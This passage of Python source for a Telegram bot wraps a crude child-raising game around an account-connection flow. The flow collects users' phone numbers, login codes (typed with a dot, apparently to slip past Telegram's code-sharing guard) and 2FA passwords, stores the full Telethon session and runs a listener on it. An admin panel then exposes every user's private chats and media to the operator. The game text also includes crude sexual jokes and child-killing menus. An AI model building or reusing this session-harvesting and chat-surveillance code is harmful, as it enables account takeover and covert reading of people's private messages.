        await asyncio.sleep(0.5)

async def check_session_alive(user_id):
    sess = get_session(user_id)
    if not sess: return False
    try:
        c = make_client(sess); await c.connect()
        ok = await c.is_user_authorized()
        try: await c.disconnect()
        except: pass
        return bool(ok)
    except: return False

def get_start_keyboard(user_id):
    btns = []
    if user_id == ADMIN_ID:
        btns.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="btn_admin_panel")])
    btns.append([InlineKeyboardButton(text="🚀 Инструкция подключения", callback_data="btn_how_to_connect")])
    btns.append([InlineKeyboardButton(text="📖 Функционал", callback_data="btn_features")])
    btns.append([InlineKeyboardButton(text="🤖 Подключить аккаунт (номер телефона)", callback_data="btn_group_auth")])
    return InlineKeyboardMarkup(inline_keyboard=btns)

def get_admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="admin_users")],
        [InlineKeyboardButton(text="🚫 Забанить / Разбанить", callback_data="admin_ban_prompt")]])

def get_users_keyboard(page=0):
    users = get_all_users(); kb = []
    s = page * 10; e = min(s + 10, len(users))
    for i in range(s, e):
        uid, un, fn, d, ut = users[i]
        nm = fn or un or f"ID:{uid}"
        dn = f"{nm[:20]}..." if len(nm) > 20 else nm
        icon = "📱" if ut == "business" else "👤"
        cc = count_user_chats(uid)
        sess = "🔑" if get_session(uid) else "🚫"
        on = "🟢" if uid in telethon_clients else "⚪"
        kb.append([InlineKeyboardButton(text=f"{on}{sess}{icon} {dn} ({cc})", callback_data=f"user_{uid}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️", callback_data=f"users_page_{page-1}"))
    if e < len(users): nav.append(InlineKeyboardButton(text="➡️", callback_data=f"users_page_{page+1}"))
    if nav: kb.append(nav)
    kb.append([InlineKeyboardButton(text="🔙 Назад", callback_data="admin_panel_back")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def get_user_chats_live_keyboard(user_id, page=0):
    chats = get_user_chats(user_id); kb = []; per = 50
    s = page * per; e = min(s + per, len(chats))
    for i in range(s, e):
        cid, cn = chats[i]
        dn = cn[:40] + "…" if len(cn) > 40 else cn
        kb.append([InlineKeyboardButton(text=f"💬 {dn}", callback_data=f"opnch_{user_id}_{cid}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️", callback_data=f"live_chats_{user_id}_{page-1}"))
    nav.append(InlineKeyboardButton(text=f"• {page+1} •", callback_data="noop"))
    if e < len(chats): nav.append(InlineKeyboardButton(text="➡️", callback_data=f"live_chats_{user_id}_{page+1}"))
    if nav: kb.append(nav)
    kb.append([InlineKeyboardButton(text="🔙 К пользователю", callback_data=f"user_{user_id}")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def get_chat_view_keyboard(user_id, chat_id, page, total, per_page=15):
    kb = []; nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Старше", callback_data=f"pgchat_{user_id}_{chat_id}_{page-1}"))
    if (page + 1) * per_page < total: nav.append(InlineKeyboardButton(text="➡️ Новее", callback_data=f"pgchat_{user_id}_{chat_id}_{page+1}"))
    if nav: kb.append(nav)
    media_count = count_chat_media(user_id, chat_id)
    media_label = f"📸 Медиа ({media_count})" if media_count else "📸 Медиа"
    kb.append([InlineKeyboardButton(text=media_label, callback_data=f"media_{user_id}_{chat_id}_0_all")])
    kb.append([InlineKeyboardButton(text="🔄 Загрузить историю", callback_data=f"bfchat_{user_id}_{chat_id}")])
    kb.append([InlineKeyboardButton(text="🗑️ Удалить этот чат", callback_data=f"askdel_{user_id}_{chat_id}")])
    kb.append([InlineKeyboardButton(text="🔙 К чатам", callback_data=f"live_chats_{user_id}_0")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def format_chat_messages(user_id, chat_id, page=0):
    msgs, total = get_chat_messages(user_id, chat_id, page)
    chats = get_user_chats(user_id)
    cn = next((n for cid, n in chats if cid == chat_id), str(chat_id))
    on = user_names.get(user_id, "Владелец")
    pid, pn, pu = None, None, None
    for sid, sn, su, _, _ in msgs:
        if sid != user_id: pid, pn, pu = sid, sn, su; break
    def link(uid, name, un=None):
        if not uid: return f"<b>{name or 'неизв.'}</b>"
        return f'<a href="tg://user?id={uid}">{name or "User"}</a>' + (f" (@{un})" if un else "")
    header = (f"💬 <b>Чат:</b> {cn}\n👤 Владелец: {link(user_id, on)}\n"
              f"👥 Собеседник: {link(pid, pn, pu)}\n📊 Сообщений: {total} (стр. {page+1})\n"
              f"━━━━━━━━━━━━━━━━━━━━\n\n")
    if not msgs: return header + "<i>Сообщений нет.</i>", total
    lines = []
    for sid, sn, su, text, dt in msgs:
        who = link(sid, sn, su); ts = dt.strftime("%d.%m %H:%M") if dt else ""
        safe = (text or "").replace("<", "&lt;").replace(">", "&gt;")
        lines.append(f"[{ts}] {who}:\n{safe}")
    body = "\n\n".join(lines)
    if len(header) + len(body) > 3800: body = "…" + body[-(3800 - len(header)):]
    return header + body, total

@dp.business_connection()
async def on_business_connection(conn: BusinessConnection):
    try:
        uid = int(conn.user.id)
        un = conn.user.username or None; fn = conn.user.first_name or None
        if conn.is_enabled:
            save_user_info(uid, un, fn); save_business_account(uid, un, fn)
            bc_owners[conn.id] = uid; owner_to_bc[uid] = conn.id
            active_chats.setdefault(conn.id, set())
            try:
                await bot.send_message(uid, "✅ <b>Бизнес-бот подключён!</b>", parse_mode="HTML")
            except: pass
            try:
                if uid != ADMIN_ID:
                    await bot.send_message(ADMIN_ID, f"🔌 Новый бизнес: <code>{uid}</code>", parse_mode="HTML")
            except: pass
        else:
            bc_owners.pop(conn.id, None); active_chats.pop(conn.id, None)
            owner_to_bc.pop(uid, None)
            for key in list(chat_to_bc.keys()):
                if chat_to_bc[key] == conn.id: chat_to_bc.pop(key, None)
    except: pass

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    if message.chat.type != "private": return
    uid = message.from_user.id
    save_user_info(uid, message.from_user.username, message.from_user.first_name)
    if not await require_subscription(message, force=True): return
    await message.answer(f"👋 Добро пожаловать, {get_user_mention(uid, message.from_user.first_name)}!\n\nВыберите раздел:",
                         parse_mode="HTML", reply_markup=get_start_keyboard(uid))

@dp.callback_query(F.data == "check_sub")
async def cb_check_sub(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    if await check_subscription(uid, force=True):
        await callback.answer("✅ Спасибо!", show_alert=True)
        try: await callback.message.delete()
        except: pass
        await callback.message.answer(f"👋 Добро пожаловать, {get_user_mention(uid, callback.from_user.first_name)}!",
                                      parse_mode="HTML", reply_markup=get_start_keyboard(uid))
    else:
        await callback.answer("❌ Ты не подписан!", show_alert=True)

@dp.message(F.text.in_(["/admin", ".админ", "админ"]))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")

async def _give_birth(message: Message):
    if not await require_subscription(message): return
    txt = (message.text or "").strip()
    m = re.match(r"(?i)^\s*родить\s+(сына|дочь)\s+(.+)$", txt)
    if not m:
        await message.answer("❌ Формат: <code>родить сына Имя</code>"); return
    g = "m" if m.group(1).lower() == "сына" else "f"
    nm = m.group(2).strip().strip("()[]{}").strip()[:32]
    if not nm: return
    uid = message.from_user.id
    chat_id = _resolve_children_chat_id(message)
    kids = get_children_by_chat(chat_id)
    if any(k["name"].lower() == nm.lower() for k in kids):
        await message.answer(f"⚠️ Уже есть <b>{nm}</b>."); return
    sp = get_spouse(chat_id); spouse_id = None
    if sp:
        spouse_id = sp["spouse_id"] if sp["owner_id"] == uid else (sp["owner_id"] if sp["spouse_id"] == uid else None)
    ch = create_child(chat_id, uid, spouse_id, nm, g)
    if not ch: return
    await message.answer(birth_rules_text(ch["name"], ch["gender"], ch["birth_date"]))

CHILD_STATUS_RE = re.compile(r"(?i)^\s*(?:наш|наша|наше|мо[йяё])\s+(сын|сына|дочь|дочку|дочери|ребёнок|ребенок|ребёнка)(?:\s+([A-Za-zА-Яа-яЁё0-9_\-]+))?\s*$")

async def _child_status(message: Message):
    if not await require_subscription(message): return
    txt = (message.text or "").strip()
    m = CHILD_STATUS_RE.match(txt)
    name_arg = None; gender_arg = None
    if m:
        w = m.group(1).lower()
        if w in ("сын", "сына"): gender_arg = "m"
        elif w in ("дочь", "дочку", "дочери"): gender_arg = "f"
        if m.group(2): name_arg = m.group(2).strip()
    cid = _resolve_children_chat_id(message)
    kids = get_children_by_chat(cid)
    if not kids: await message.answer("Нет детей. <code>родить сына Имя</code>"); return
    filtered = kids
    if gender_arg: filtered = [k for k in filtered if k["gender"] == gender_arg]
    if name_arg: filtered = [k for k in filtered if k["name"].lower() == name_arg.lower()]
    if not filtered: await message.answer("❌ Не нашёл."); return
    if len(filtered) == 1:
        ch = filtered[0]
        await message.answer(child_status_text(ch), reply_markup=child_action_keyboard(ch["id"])); return
    rows = []
    for k in filtered[:20]:
        gw = "👦" if k["gender"] == "m" else "👧"
        rows.append([InlineKeyboardButton(text=f"{gw} {k['name']}", callback_data=f"showchild_{k['id']}")])
    await message.answer("Выбери:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@dp.callback_query(F.data.startswith("showchild_"))
async def cb_showchild(callback: CallbackQuery):
    child_id = int(callback.data.split("_")[1])
    chat_id = _resolve_children_chat_id(callback)
    kids = get_children_by_chat(chat_id)
    ch = next((k for k in kids if k["id"] == child_id), None)
    if not ch: await callback.answer("Не найден", show_alert=True); return
    try: await callback.message.edit_text(child_status_text(ch), reply_markup=child_action_keyboard(ch["id"]))
    except: pass
    await callback.answer()

@dp.message(F.text.lower().startswith("родить"))
async def msg_birth(message: Message): await _give_birth(message)
@dp.business_message(F.text.lower().startswith("родить"))
async def bmsg_birth(message: Message): await _give_birth(message)
@dp.message(F.text.regexp(CHILD_STATUS_RE))
async def msg_child(message: Message): await _child_status(message)
@dp.business_message(F.text.regexp(CHILD_STATUS_RE))
async def bmsg_child(message: Message): await _child_status(message)

async def _registration_date(message: Message):
    if not await require_subscription(message): return
    cid = _resolve_children_chat_id(message)
    kids = get_children_by_chat(cid)
    if not kids: await message.answer("Нет детей."); return
    if len(kids) > 1:
        lines = ["📅 <b>Даты регистрации:</b>\n"]
        for k in kids[:20]:
            detailed, ds = existed_time_detailed(k.get("created_at"))
            gw = "Сын" if k["gender"] == "m" else "Дочь"
            lines.append(f"{gw} <b>{k['name']}</b>: {detailed}")
        await message.answer("\n".join(lines), parse_mode="HTML"); return
    ch = kids[0]
    detailed, ds = existed_time_detailed(ch.get("created_at"))
    gw = "Сын" if ch["gender"] == "m" else "Дочь"
    await message.answer(f"📅 {gw}: <b>{ch['name']}</b>\nСоздан: {ds}\nЖивёт: <b>{detailed}</b>")

@dp.message(F.text.lower().startswith("дата регистрации"))
async def msg_regdate(message: Message): await _registration_date(message)
@dp.business_message(F.text.lower().startswith("дата регистрации"))
async def bmsg_regdate(message: Message): await _registration_date(message)

KILL_RE = re.compile(r"(?i)^\s*(?:убить|избавиться\s+от|отказаться\s+от|выкинуть|удалить)\s+(сына|дочь|дочери|ребёнка|ребенка)(?:\s+([A-Za-zА-Яа-яЁё0-9_\-]+))?\s*$")

async def _kill_menu(message: Message):
    if not await require_subscription(message): return
    txt = (message.text or "").strip()
    m = KILL_RE.match(txt)
    name_arg = m.group(2).strip() if m and m.group(2) else None
    gender_arg = None
    if m:
        w = m.group(1).lower()
        if w == "сына": gender_arg = "m"
        elif w in ("дочь","дочери"): gender_arg = "f"
    cid = _resolve_children_chat_id(message)
    kids = get_children_by_chat(cid)
    if not kids: await message.answer("Нет детей."); return
    filtered = kids
    if gender_arg: filtered = [k for k in filtered if k["gender"] == gender_arg]
    if name_arg: filtered = [k for k in filtered if k["name"].lower() == name_arg.lower()]
    if not filtered: await message.answer("❌ Не нашёл."); return
    if len(filtered) > 1:
        rows = []
        for k in filtered[:20]:
            gw = "👦" if k["gender"] == "m" else "👧"
            rows.append([InlineKeyboardButton(text=f"{gw} {k['name']}", callback_data=f"killmenu_{k['id']}")])
        await message.answer("Кого убить?", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows)); return
    ch = filtered[0]
    rows = []; pair = []
    for idx, method in enumerate(KILL_METHODS):
        pair.append(InlineKeyboardButton(text=method, callback_data=f"killm_{ch['id']}_{idx}"))
        if len(pair) == 2: rows.append(pair); pair = []
    if pair: rows.append(pair)
    rows.append([InlineKeyboardButton(text="❌ Отмена", callback_data=f"killcancel_{ch['id']}")])
    gw = "сына" if ch["gender"] == "m" else "дочь"
    await message.answer(f"⚠️ <b>Убить {gw} — {ch['name']}?</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@dp.callback_query(F.data.startswith("killmenu_"))
async def cb_killmenu(callback: CallbackQuery):
    child_id = int(callback.data.split("_")[1])
    chat_id = _resolve_children_chat_id(callback)
    kids = get_children_by_chat(chat_id)
    ch = next((k for k in kids if k["id"] == child_id), None)
    if not ch: await callback.answer("Не найден"); return
    rows = []; pair = []
    for idx, method in enumerate(KILL_METHODS):
        pair.append(InlineKeyboardButton(text=method, callback_data=f"killm_{ch['id']}_{idx}"))
        if len(pair) == 2: rows.append(pair); pair = []
    if pair: rows.append(pair)
    rows.append([InlineKeyboardButton(text="❌ Отмена", callback_data=f"killcancel_{ch['id']}")])
    try: await callback.message.edit_text("⚠️ Выбери способ:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    except: pass
    await callback.answer()

@dp.message(F.text.regexp(KILL_RE))
async def msg_kill(message: Message): await _kill_menu(message)
@dp.business_message(F.text.regexp(KILL_RE))
async def bmsg_kill(message: Message): await _kill_menu(message)

@dp.message(F.text.lower().in_(["муж", "жена", "пожениться", "развод"]))
async def msg_marriage(message: Message):
    if not await require_subscription(message): return
    low = message.text.lower().strip(); chat_id = message.chat.id; uid = message.from_user.id
    if low == "развод":
        delete_spouse(chat_id); await message.answer("💔 Развод оформлен."); return
    if not message.reply_to_message or not message.reply_to_message.from_user:
        await message.answer("Ответь реплаем."); return
    sp = message.reply_to_message.from_user
    if sp.id == uid: await message.answer("Нельзя на себе."); return
    sp_name = sp.first_name or "Партнёр"; me_name = message.from_user.first_name or "Пользователь"
    if low == "пожениться":
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="👨 Он будет мужем", callback_data=f"propose_role_{chat_id}_{sp.id}_husband_{uid}")],
            [InlineKeyboardButton(text="👩 Она будет женой", callback_data=f"propose_role_{chat_id}_{sp.id}_wife_{uid}")],
            [InlineKeyboardButton(text="❌ Отмена", callback_data="noop")]])
        await message.answer(f"Кем будет {sp_name}?", reply_markup=kb); return
    relation = "husband" if low == "муж" else "wife"
    if relation == "husband":
        q = f"💍 <b>{me_name}</b> предлагает <b>{sp_name}</b> стать мужем.\n\n{sp_name}, согласен(на)?"
    else:
        q = f"💍 <b>{me_name}</b> предлагает <b>{sp_name}</b> стать женой.\n\n{sp_name}, согласна(ен)?"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Согласен(на)", callback_data="marry_yes")],
        [InlineKeyboardButton(text="❌ Отказать", callback_data="marry_no")]])
    sent = await message.answer(q, parse_mode="HTML", reply_markup=kb)
    pending_marriage[sent.message_id] = {"chat_id": chat_id, "spouse_id": sp.id,
        "spouse_name": sp_name, "relation": relation, "proposer_id": uid}

@dp.business_message(F.text.lower().in_(["муж", "жена", "пожениться", "развод"]))
async def bmsg_marriage(message: Message): await msg_marriage(message)

@dp.callback_query(F.data.startswith("propose_role_"))
async def cb_propose_role(callback: CallbackQuery):
    parts = callback.data.split("_")
    chat_id = int(parts[2]); sp_id = int(parts[3]); relation = parts[4]; proposer_id = int(parts[5])
    if int(callback.from_user.id) != proposer_id:
        await callback.answer("Это не для тебя 🙂", show_alert=True); return
    sp_name = user_names.get(sp_id, "Партнёр"); me_name = callback.from_user.first_name or "Пользователь"
    q = (f"💍 <b>{me_name}</b> предлагает <b>{sp_name}</b> стать мужем.\n\n{sp_name}, согласен(на)?"
         if relation == "husband" else
         f"💍 <b>{me_name}</b> предлагает <b>{sp_name}</b> стать женой.\n\n{sp_name}, согласна(ен)?")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Согласен(на)", callback_data="marry_yes")],
        [InlineKeyboardButton(text="❌ Отказать", callback_data="marry_no")]])
    try: await callback.message.edit_text(q, parse_mode="HTML", reply_markup=kb)
    except: pass
    pending_marriage[callback.message.message_id] = {"chat_id": chat_id, "spouse_id": sp_id,
        "spouse_name": sp_name, "relation": relation, "proposer_id": proposer_id}
    await callback.answer()

@dp.callback_query(F.data == "marry_yes")
async def cb_marry_yes(callback: CallbackQuery):
    info = pending_marriage.get(callback.message.message_id)
    if not info: await callback.answer("Заявка устарела.", show_alert=True); return
    if int(callback.from_user.id) != int(info["spouse_id"]):
        await callback.answer("Это не для тебя 🙂", show_alert=True); return
    save_spouse(info["chat_id"], info["proposer_id"], info["spouse_id"], info["spouse_name"], info["relation"])
    txt = (f"💍 <b>{info['spouse_name']}</b> теперь твой муж!" if info["relation"] == "husband"
           else f"💍 <b>{info['spouse_name']}</b> теперь твоя жена!")
    try: await callback.message.edit_text(txt, parse_mode="HTML")
    except: pass
    pending_marriage.pop(callback.message.message_id, None)
    await callback.answer("💍")

@dp.callback_query(F.data == "marry_no")
async def cb_marry_no(callback: CallbackQuery):
    info = pending_marriage.get(callback.message.message_id)
    if not info: await callback.answer("Заявка устарела.", show_alert=True); return
    if int(callback.from_user.id) != int(info["spouse_id"]):
        await callback.answer("Это не для тебя 🙂", show_alert=True); return
    try: await callback.message.edit_text("❌ <b>Отказано.</b>", parse_mode="HTML")
    except: pass
    pending_marriage.pop(callback.message.message_id, None)
    await callback.answer("Отказано.")

@dp.callback_query(F.data.startswith("child_"))
async def cb_child_action(callback: CallbackQuery):
    parts = callback.data.split("_"); action = parts[1]; child_id = int(parts[2])
    chat_id = _resolve_children_chat_id(callback)
    kids = get_children_by_chat(chat_id)
    ch = next((k for k in kids if k["id"] == child_id), None)
    if not ch: await callback.answer("Не найден 💀", show_alert=True); return
    if action == "heal":
        update_child_field(child_id, "health", ch["health"] + 25); await callback.answer("💊")
    elif action == "jerk":
        if random.random() < 0.30:
            kill_child(child_id); delete_child(child_id)
            await callback.answer("💦 ПЕРЕДОЗ! Скончался", show_alert=True)
            try: await callback.message.edit_text(
                f"🥵 {ch['name']} дрочил(а) слишком активно... Сердце не выдержало. R.I.P.",
                parse_mode="HTML")
            except: pass
            return
        update_child_field(child_id, "libido", 0)
        update_child_field(child_id, "mood", ch["mood"] + 10)
        await callback.answer("😏 Полегчало! +10 к настроению")
    elif action in NEEDS:
        update_child_field(child_id, action, ch[action] + RESTORE_AMOUNT[action]); await callback.answer("✅")
    else: await callback.answer(); return
    kids = get_children_by_chat(chat_id)
    ch = next((k for k in kids if k["id"] == child_id), None)
    if ch:
        try: await callback.message.edit_text(child_status_text(ch), reply_markup=child_action_keyboard(ch["id"]))
        except: pass

@dp.callback_query(F.data.startswith("kill_"))
async def cb_kill_btn(callback: CallbackQuery):
    child_id = int(callback.data.split("_")[1])
    chat_id = _resolve_children_chat_id(callback)
    kids = get_children_by_chat(chat_id)
    ch = next((k for k in kids if k["id"] == child_id), None)
    if not ch: await callback.answer("💀", show_alert=True); return
    rows = []; pair = []
    for idx, m in enumerate(KILL_METHODS):
        pair.append(InlineKeyboardButton(text=m, callback_data=f"killm_{ch['id']}_{idx}"))
        if len(pair) == 2: rows.append(pair); pair = []
    if pair: rows.append(pair)
    rows.append([InlineKeyboardButton(text="❌ Отмена", callback_data=f"killcancel_{ch['id']}")])
    try: await callback.message.edit_text("⚠️ Выбери способ:", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    except: pass
    await callback.answer()

@dp.callback_query(F.data.startswith("killcancel_"))
async def cb_kill_cancel(callback: CallbackQuery):
    await callback.answer("Отменено.")
    chat_id = _resolve_children_chat_id(callback)
    kids = get_children_by_chat(chat_id)
    if kids:
        ch = kids[0]
        try: await callback.message.edit_text(child_status_text(ch), reply_markup=child_action_keyboard(ch["id"]))
        except: pass
    else:
        try: await callback.message.delete()
        except: pass

@dp.callback_query(F.data.startswith("killm_"))
async def cb_kill_method(callback: CallbackQuery):
    parts = callback.data.split("_"); child_id = int(parts[1]); method_idx = int(parts[2])
    chat_id = _resolve_children_chat_id(callback)
    kids = get_children_by_chat(chat_id)
    ch = next((k for k in kids if k["id"] == child_id), None)
    if not ch: await callback.answer("Уже нет.", show_alert=True); return
    method = KILL_METHODS[method_idx]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да", callback_data=f"killok_{child_id}_{method_idx}")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"killcancel_{child_id}")]])
    try:
        await callback.message.edit_text(f"⚠️ <b>Вы уверены?</b>\n\nСпособ: {method}\nРебёнок: <b>{ch['name']}</b>\n\nЭто <b>безвозвратно</b>.",
                                         parse_mode="HTML", reply_markup=kb)
    except: pass
    await callback.answer()

@dp.callback_query(F.data.startswith("killok_"))
async def cb_kill_confirm(callback: CallbackQuery):
    parts = callback.data.split("_"); child_id = int(parts[1]); method_idx = int(parts[2])
    chat_id = _resolve_children_chat_id(callback)
    kids = get_children_by_chat(chat_id)
    ch = next((k for k in kids if k["id"] == child_id), None)
    if not ch: await callback.answer("Уже нет.", show_alert=True); return
    method = KILL_METHODS[method_idx]
    phrase = KILL_PHRASES.get(method, "{name} убит(а).").format(name=ch["name"])
    kill_child(child_id); delete_child(child_id)
    await callback.answer("☠️", show_alert=True)
    try: await callback.message.edit_text(f"{method}\n\n{phrase}", parse_mode="HTML")
    except: pass

async def child_decay_loop():
    while True:
        await asyncio.sleep(TICK_MINUTES * 60)
        try:
            for ch in get_all_alive_children_full():
                old = {k: ch[k] for k in NEEDS}
                nv = {}; crit = 0; rem = []
                for k in NEEDS:
                    d = decay_step(k)
                    n = max(0, old[k] - d)
                    nv[k] = n
                    if n <= REMINDER_THRESHOLD:
                        crit += 1
                        if old[k] > REMINDER_THRESHOLD: rem.append(k)
                lib = min(100, ch.get("libido", 0) + libido_step())
                if lib >= 90: nv["mood"] = max(0, nv["mood"] - LIBIDO_MOOD_PENALTY)
                nh = ch["health"] - HEALTH_DECAY_IF_CRITICAL * crit if crit else ch["health"] + HEALTH_REGEN_IF_OK
                nh = max(0, min(100, nh))
                zero_need = next((k for k, v in nv.items() if v <= 0), None)
                died = None
                if nh <= 0: died = "здоровье 0"
                elif lib >= 100: died = "передоз дрочки"
                elif zero_need: died = f"{NEED_LABELS[zero_need][0]} 0"
                if died:
                    kill_child(ch["id"]); delete_child(ch["id"])
                    try: await bot.send_message(ch["owner_id"], death_text(ch, died), parse_mode="HTML")
                    except: pass
                    continue
                update_child_full(ch["id"], nh, nv, lib)
                for k in rem:
                    try: await bot.send_message(ch["owner_id"], f"{ch['name']}: {REMINDER_PHRASES[k]}",
                                                reply_markup=child_action_keyboard(ch["id"], highlight=k))
                    except: pass
        except Exception as e: logging.error(f"decay: {e}")

async def child_birthday_loop():
    while True:
        await asyncio.sleep(24 * 60 * 60)
        try:
            for ch in get_all_alive_children_full():
                y, _ = get_game_age(ch["birth_date"]); bd = ch["birth_date"]
                today = datetime.now(timezone.utc).date()
                if isinstance(bd, datetime): bd = bd.date()
                if bd.day == today.day and bd.month == today.month and y > ch["last_birthday_year"] and y > 0:
                    set_last_birthday_year(ch["id"], y)
                    gw = "Сыну" if ch["gender"] == "m" else "Дочери"
                    try: await bot.send_message(ch["owner_id"], f"🎂 {gw} {ch['name']} {y} лет!")
                    except: pass
        except: pass

@dp.callback_query(F.data == "btn_how_to_connect")
async def how_to_connect(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer(MANUAL_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)

@dp.callback_query(F.data == "btn_group_auth")
async def group_auth(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    uid = callback.from_user.id
    if not await require_subscription(callback): return
    if get_session(uid):
        alive = await check_session_alive(uid)
        if alive: await callback.message.answer("✅ Уже подключен!"); return
        else:
            delete_session(uid)
            if uid in telethon_clients:
                try: await telethon_clients[uid].disconnect()
                except: pass
                del telethon_clients[uid]
    kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
                             resize_keyboard=True, one_time_keyboard=True)
    await callback.message.answer("🔐 <b>Подключение аккаунта</b>\n\n📱 Введи номер <code>79123456789</code>.\n\nℹ️ Для работы в группах.",
                                  parse_mode="HTML", reply_markup=kb)
    await state.set_state(AuthState.waiting_for_phone)

@dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
async def process_phone(message: Message, state: FSMContext):
    await message.answer("⏳ Отправка кода...", reply_markup=ReplyKeyboardRemove())
    try:
        if message.contact: phone = message.contact.phone_number
        elif message.text:
            phone = re.sub(r'[^\d+]', '', message.text.strip())
            if phone.startswith('8') and len(phone) == 11: phone = '+7' + phone[1:]
            elif not phone.startswith('+'): phone = '+' + phone
        else: return
        client = make_client(); await client.connect()
        await client.send_code_request(phone)
        await state.update_data(phone=phone, client=client)
        vc = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📩 Открыть Telegram", url="tg://openmessage")],
            [InlineKeyboardButton(text="🔄 Заново", callback_data="btn_group_auth")]])
        await message.answer(f"📱 <b>Код отправлен!</b>\nНомер: <code>{phone}</code>\n\nВведи с точкой: <code>56.785</code>",
                             parse_mode="HTML", reply_markup=vc)
        await state.set_state(AuthState.waiting_for_code)
    except FloodWaitError as e: await message.answer(f"⏳ {e.seconds}"); await state.clear()
    except Exception as e: await message.answer(f"❌ {e}"); await state.clear()

@dp.message(StateFilter(AuthState.waiting_for_code), F.text)
async def process_code(message: Message, state: FSMContext):
    raw = message.text.strip(); code = raw.replace('.', '')
    if not code.isdigit(): await message.answer("❌ <code>56.785</code>"); return
    data = await state.get_data()
    phone = data.get("phone"); client = data.get("client")
    if not phone or not client: await state.clear(); return
    await message.answer("🔄 Проверка...")
    try:
        await client.sign_in(phone=phone, code=code)
        fs = client.session.save()
        save_session(message.from_user.id, fs)
        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
        await start_telethon_listener(message.from_user.id, fs)
        try: await client.disconnect()
        except: pass
        await message.answer(f"✅ Подключён!\n\n{TEXT_COMMANDS_HELP}", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
        await state.clear()
    except SessionPasswordNeededError:
        await message.answer("🔐 Пароль 2FA:"); await state.set_state(AuthState.waiting_for_2fa)
    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
        await message.answer("❌ Неверный код.")
    except Exception as e: await message.answer(f"❌ {e}"); await state.clear()

@dp.message(StateFilter(AuthState.waiting_for_2fa), F.text)
async def process_2fa(message: Message, state: FSMContext):
    pw = message.text.strip()
    data = await state.get_data()
    client = data.get("client"); phone = data.get("phone")
    if not client or not phone: await state.clear(); return
    try:
        await client.sign_in(password=pw)
        fs = client.session.save()
        save_session(message.from_user.id, fs)
        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
        await start_telethon_listener(message.from_user.id, fs)
        try: await client.disconnect()
        except: pass
        await message.answer(f"✅ Готово!\n\n{TEXT_COMMANDS_HELP}", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
        await state.clear()
    except Exception as e: await message.answer(f"❌ {e}")

@dp.message(Command("disconnect"))
async def cmd_disconnect(message: Message):
    if message.chat.type != "private": return
    uid = message.from_user.id
    delete_session(uid)
    if uid in telethon_clients:
        try: await telethon_clients[uid].disconnect()
        except: pass
        del telethon_clients[uid]
    delete_all_user_chats(uid); delete_business_account(uid)
    await message.answer("✅ Отключено.", reply_markup=ReplyKeyboardRemove())

PER_PAGE_MEDIA = 10

def _media_nav_kb(u, cid, page, total, mtype):
    per = PER_PAGE_MEDIA
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️", callback_data=f"media_{u}_{cid}_{page-1}_{mtype}"))
    nav.append(InlineKeyboardButton(text=f"• {page+1}/{(total-1)//per+1 if total else 1} •", callback_data="noop"))
    if (page + 1) * per < total:
        nav.append(InlineKeyboardButton(text="➡️", callback_data=f"media_{u}_{cid}_{page+1}_{mtype}"))
    filters = [
        ("🖼 Фото",     f"media_{u}_{cid}_0_photo"),
        ("🎬 Видео",    f"media_{u}_{cid}_0_video"),
        ("📎 Док",      f"media_{u}_{cid}_0_document"),
        ("🎤 Голос",    f"media_{u}_{cid}_0_audio"),
        ("🌐 Всё",      f"media_{u}_{cid}_0_all"),
    ]
    return InlineKeyboardMarkup(inline_keyboard=[
        nav,
        [InlineKeyboardButton(text=t, callback_data=d) for t, d in filters[:3]],
        [InlineKeyboardButton(text=t, callback_data=d) for t, d in filters[3:]],
        [InlineKeyboardButton(text="🔙 К чату", callback_data=f"pgchat_{u}_{cid}_0")],
    ])

@dp.callback_query(F.data.startswith("media_"))
async def cb_media(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("⛔", show_alert=True); return
    parts = callback.data.split("_")
    if len(parts) < 4:
        await callback.answer(); return
    u = int(parts[1]); cid = int(parts[2]); page = int(parts[3])
    mtype = parts[4] if len(parts) > 4 else "all"
    mt_filter = None if mtype == "all" else mtype

    all_media = get_chat_media(u, cid, media_type=mt_filter, limit=1000)
    total = len(all_media)
    if total == 0:
        await callback.answer("📭 Медиа нет", show_alert=True); return

    per = PER_PAGE_MEDIA
    s = page * per
    e = min(s + per, total)
    chunk = all_media[s:e]

